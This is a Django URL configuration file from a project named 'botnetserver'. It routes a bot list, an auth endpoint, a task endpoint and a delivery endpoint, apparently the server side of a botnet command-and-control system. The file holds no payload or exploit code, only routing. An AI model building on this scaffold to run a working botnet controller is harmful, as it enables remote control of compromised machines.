"""botnetserver URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/1.11/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  url(r'^$', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  url(r'^$', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.conf.urls import url, include
    2. Add a URL to urlpatterns:  url(r'^blog/', include('blog.urls'))
"""
from django.conf.urls import url

from bots.api import AuthView, TaskView, DeliveryView
from bots.views import BotListView

urlpatterns = [
    url(r'^$', BotListView.as_view(), name="auth"),
    url(r'^auth/$', AuthView.as_view(), name="auth"),
    url(r'^tasks/$', TaskView.as_view(), name="tasks"),
    url(r'^delivery/$', DeliveryView.as_view(), name="delivery")
]
